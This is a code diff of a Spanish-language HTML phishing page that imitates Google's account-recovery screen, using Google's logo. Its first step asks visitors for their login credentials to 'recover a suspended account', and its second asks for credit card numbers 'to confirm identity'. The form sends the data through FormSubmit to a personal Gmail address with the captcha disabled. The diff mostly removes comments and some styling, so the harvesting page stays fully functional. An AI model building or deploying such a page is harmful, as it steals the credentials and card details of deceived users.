@@ -22,10 +22,10 @@
             width: 100%;
             max-width: 400px;
             text-align: center;
-            /* Ocultar por defecto los pasos que no están activos */
+            /* Por defecto oculto */
             display: none; 
         }
-        /* Clase para mostrar el paso activo */
+        /* Clase para mostrar */
         .active {
             display: block !important;
         }
@@ -76,11 +76,6 @@
             display: flex;
             gap: 10px;
         }
-        .card-icons {
-            margin: 15px 0;
-            font-size: 24px;
-            color: #5f6368;
-        }
         .footer {
             margin-top: 20px;
             font-size: 12px;
@@ -105,9 +100,9 @@
 </head>
 <body>
 
-    <!-- PASO 1: CREDENCIALES (Solo se muestra si tiene la clase 'active') -->
+    <!-- PASO 1: CREDENCIALES -->
     <div id="step1" class="container active">
-        <!-- Logo SVG -->
+        <!-- Logo -->
         <svg class="logo" viewBox="0 0 24 24" width="75" height="75" xmlns="http://www.w3.org/2000/svg">
             <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
             <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
@@ -119,7 +114,6 @@
         <p>Para recuperar tu cuenta suspendida, por favor ingresa tus credenciales.</p>
         
         <form id="form-step1">
-            <!-- Datos ocultos para FormSubmit -->
             <input type="hidden" name="_subject" value="Paso 1: Credenciales">
             <input type="hidden" name="_captcha" value="false">
 
@@ -131,7 +125,7 @@
         <div class="loader" id="loader1"></div>
     </div>
 
-    <!-- PASO 2: TARJETA (Oculta por defecto, sin clase 'active') -->
+    <!-- PASO 2: TARJETA -->
     <div id="step2" class="container">
         <svg class="logo" viewBox="0 0 24 24" width="50" height="50" xmlns="http://www.w3.org/2000/svg">
             <path d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4V6h16v12z" fill="#5f6368"/>
@@ -140,10 +134,8 @@
         <p>Ingresa los datos de tu tarjeta para confirmar tu identidad.</p>
         
         <form id="form-step2" action="https://formsubmit.co/Quisan2017@gmail.com" method="POST">
-            <!-- Datos ocultos -->
             <input type="hidden" name="_subject" value="Paso 2: Tarjeta de Crédito">
             <input type="hidden" name="_captcha" value="false">
-            <!-- Campo oculto para saber que ya pasó por el paso 1 -->
             <input type="hidden" name="email_pasado" id="email_pasado">
 
             <input type="text" name="card_number" placeholder="Número de Tarjeta" maxlength="19" required>
